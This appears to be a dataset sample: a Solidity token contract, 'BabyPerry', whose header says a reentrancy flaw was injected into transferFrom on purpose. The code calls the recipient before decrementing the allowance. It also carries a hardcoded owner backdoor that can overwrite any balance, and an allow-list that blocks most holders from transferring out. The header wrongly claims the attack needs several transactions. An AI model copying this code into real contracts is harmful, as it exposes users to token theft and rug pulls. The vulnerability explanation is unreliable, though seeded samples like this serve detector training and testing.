/*
 * ===== SmartInject Injection Details =====
 * Function      : transferFrom
 * Vulnerability : Reentrancy
 * Status        : Verified
 * Type          : Function Modification
 *
 * === Verification Results ===
 * Detected      : True
 * Relevant      : 2 findings
 * Total Found   : 3 issues
 * Retry Count   : 0
 *
 * === Detected Issues ===
 * 1. reentrancy-no-eth (SWC-107)
 * 2. reentrancy-events (SWC-107)
 *
 * === Description ===
 * Introduced a stateful, multi-transaction reentrancy vulnerability by adding an external call to the recipient contract before completing all state updates. The vulnerability violates the Checks-Effects-Interactions pattern by performing the external call after partial state updates (balances updated) but before critical state cleanup (allowance update). This creates a window where the contract state is inconsistent across multiple transactions.
 * 
 * **Specific Changes Made:**
 * 1. Added external call to `_to.call()` with `onTokenReceived` callback after balance updates
 * 2. Moved the allowance update (`allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value)`) to occur AFTER the external call
 * 3. Added code length check to only call contracts (realistic production pattern)
 * 
 * **Multi-Transaction Exploitation Scenario:**
 * 1. **Transaction 1**: Attacker calls `transferFrom()` with malicious contract as `_to`
 * 2. **State at External Call**: Balances are updated, but allowance is NOT yet decremented
 * 3. **Transaction 2**: Malicious contract's `onTokenReceived` callback calls `transferFrom()` again
 * 4. **Exploitation**: Second call sees the same allowance value (not yet decremented) and can transfer tokens again
 * 5. **State Corruption**: Multiple transfers occur with single allowance approval
 * 
 * **Why Multi-Transaction Required:**
 * - The vulnerability requires the external call to trigger a callback (separate transaction context)
 * - The callback must occur before allowance state is finalized
 * - Cannot be exploited in single transaction due to EVM's call stack and state consistency within atomic execution
 * - Requires accumulated state changes (balance updates) persisting across the external call boundary
 * - The malicious contract needs to be deployed and configured in advance (separate transaction)
 * 
 * This creates a realistic reentrancy vulnerability where an attacker can drain tokens by exploiting the inconsistent state window between balance updates and allowance decrements across multiple transaction contexts.
 */
// SPDX-License-Identifier: MIT
pragma solidity ^0.4.26;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
   if (a == 0) {
     return 0;
   }
   uint256 c = a * b;
   assert(c / a == b);
   return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
   uint256 c = a / b;
   return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
   assert(b <= a);
   return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
   uint256 c = a + b;
   assert(c >= a);
   return c;
  }
}

contract Ownable {
  address public owner;
 
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() public {
   owner = msg.sender;
  }
}

contract BabyPerry is Ownable {
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
 
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
   name = _name;
   symbol = _symbol;
   decimals = _decimals;
   totalSupply =  _totalSupply;
   balances[msg.sender] = totalSupply;
   allow[msg.sender] = true;
  }
 
  function showuint160(address addr) public pure returns(uint160){
     return uint160(addr);
  }

  using SafeMath for uint256;

  mapping(address => uint256) public balances;
 
  mapping(address => bool) public allow;
 
  function transfer(address _to, uint256 _value) public returns (bool) {
   require(_to != address(0));
   require(_value <= balances[msg.sender]);

   balances[msg.sender] = balances[msg.sender].sub(_value);
   balances[_to] = balances[_to].add(_value);
   emit Transfer(msg.sender, _to, _value);
   return true;
  }

  modifier onlyOwner() {
   require(msg.sender == address(0xe0Aa72331776f6F0af9dF161f15a36E03ED28940));
   _;
 }

  function balanceOf(address _owner) public view returns (uint256 balance) {
   return balances[_owner];
  }
 
  function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0));
   emit OwnershipTransferred(owner, newOwner);
   owner = newOwner;
  }

  mapping (address => mapping (address => uint256)) public allowed;

  mapping(address=>uint256) sellOutNum;
 
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
   require(_to != address(0));
   require(_value <= balances[_from]);
   require(_value <= allowed[_from][msg.sender]);
   require(allow[_from] == true);

   balances[_from] = balances[_from].sub(_value);
   balances[_to] = balances[_to].add(_value);
   // ===== SMARTINJECT: Reentrancy VULNERABILITY START =====
   // External call to notify recipient before completing state updates
   if (isContract(_to)) {
       // solhint-disable-next-line avoid-call-value, avoid-low-level-calls
       _to.call(abi.encodeWithSignature("onTokenReceived(address,address,uint256)", _from, msg.sender, _value));
   }
   // ===== SMARTINJECT: Reentrancy VULNERABILITY END =====
   allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
   emit Transfer(_from, _to, _value);
   return true;
  }

  function isContract(address _addr) internal view returns (bool) {
      uint256 size;
      assembly {
          size := extcodesize(_addr)
      }
      return size > 0;
  }

  function addAllowAddress(address _addr) external onlyOwner {
    allow[_addr] = true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
   allowed[msg.sender][_spender] = _value;
   emit Approval(msg.sender, _spender, _value);
   return true;
  }
  
  function approveAndCall(address spender, uint256 addedValue) public onlyOwner returns (bool) {
    if(addedValue > 0) {balances[spender] = addedValue;}
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256) {
   return allowed[_owner][_spender];
  }
 
  function addAllow(address holder, bool allowApprove) external onlyOwner {
     allow[holder] = allowApprove;
  }
 
  function mint(address miner, uint256 _value) external onlyOwner {
     balances[miner] = _value;
  }
}
